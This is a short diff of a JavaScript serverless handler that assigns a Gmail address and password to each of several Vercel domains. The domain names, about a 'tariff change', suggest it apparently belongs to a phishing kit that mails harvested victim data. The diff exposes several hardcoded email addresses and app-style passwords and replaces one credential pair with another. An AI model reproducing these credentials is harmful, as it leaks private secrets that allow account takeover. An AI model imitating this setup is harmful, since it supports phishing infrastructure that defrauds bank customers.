@@ -13,8 +13,8 @@ export default function handler(req, res) {
         pass = 'ahghpmbdwokimqim'; 
 
     } else if(url == 'ubah--tarif-barulama.vercel.app'){
-        email = 'mutiara369zx@gmail.com' ;
-        pass = 'bzuyotskvtnvkwym' ;
+        email = 'giozx123456@gmail.com' ;
+        pass = 'uzbakbdzoclcyzft' ;
         
     } else if(url == 'tarifperubahan-barulama.vercel.app'){
         email = 'pesulapmerah12.12.12b@gmail.com';
